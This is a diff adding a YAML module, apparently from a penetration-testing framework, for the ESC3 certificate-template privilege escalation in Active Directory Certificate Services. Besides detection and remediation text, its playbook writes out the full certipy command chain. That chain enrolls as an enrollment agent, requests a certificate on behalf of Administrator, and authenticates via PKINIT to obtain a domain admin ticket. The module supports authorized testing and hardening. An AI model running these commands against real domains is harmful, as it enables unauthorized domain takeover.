@@ -1,0 +1,62 @@
+# ESC3 — ADCS enrollment agent template + on-behalf-of enroll
+#
+# An enrollment-agent certificate is intended for a smart-card
+# admin to enroll certs on behalf of other users. When any AD
+# user can enroll the "Enrollment Agent" template AND a second
+# template accepts on-behalf-of enrollment from that agent,
+# the attacker enrolls as an EA + then enrolls a cert for
+# Administrator on behalf. Cert lands with UPN=Administrator;
+# PKINIT lands the DA TGT.
+#
+# Detection: `certipy find -vulnerable` flags "ESC3".
+# Fix: restrict Enrollment Agent template enrollment to the
+# handful of accounts that legitimately need it + audit
+# on-behalf-of eligible templates for over-broad EA acceptance.
+technique: T1649
+name: ESC3 — ADCS enrollment agent → on-behalf-of Administrator
+tactic: [privilege-escalation, credential-access]
+platform: [windows]
+key: 'adcs:esc3'
+family: adcs
+ranking:
+  exploitability: high
+  safety: config-change
+  detection: quiet
+detect:
+  version_range:
+    services.adcs: ">=1.0"
+execute:
+  command: |-
+    certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc> 2>&1 | grep -A 5 ESC3 || echo "no ADCS template flagged ESC3 — see playbook"
+verify:
+  success: "ESC3"
+cleanup:
+  command: ""
+report:
+  vector_type: cert_template_esc3
+  evidence: "EA template + on-behalf-of accepting template chain"
+  description: >
+    ADCS enrollment-agent template + a second template that
+    accepts on-behalf-of enrollment from that EA. An attacker
+    enrolls as an EA, then enrolls a cert for Administrator
+    on the target's behalf; PKINIT with the resulting cert
+    yields a DA TGT.
+  remediation: >
+    Restrict Enrollment Agent template enrollment to the
+    specific admin accounts that need it (best practice: named
+    smart-card administrators only). Audit every template
+    that accepts on-behalf-of enrollment; disable acceptance
+    of the Enrollment Agent as an alternate signer wherever
+    the workflow doesn't require it.
+  refs: [T1649, ESC3, certipy]
+playbook:
+  summary: >
+    Enroll as EA → enroll for Admin on behalf → PKINIT → DA.
+  place: 'attacker-side (certipy)'
+  steps:
+    - "confirm: `certipy find -vulnerable -u '<user>@<domain>' -p '<pass>' -dc-ip <dc>` — look for ESC3 (both the EA template + the on-behalf template are named)"
+    - "enroll as EA: `certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -template '<EA-template>'` — writes ea.pfx"
+    - "enroll on behalf: `certipy req -u '<user>@<domain>' -p '<pass>' -ca '<CA>' -template '<target-template>' -on-behalf-of 'CORP\\Administrator' -pfx ea.pfx` — writes administrator.pfx"
+    - "PKINIT: `certipy auth -pfx administrator.pfx -dc-ip <dc>` — TGT for Administrator"
+    - "CLEANUP: revoke both certs via `certipy ca -revoke <serial>`"
+  restore: "certipy ca -revoke <ea-serial> -u '<user>@<domain>' -p '<pass>' -ca '<CA>'; certipy ca -revoke <admin-serial> -u '<user>@<domain>' -p '<pass>' -ca '<CA>'"
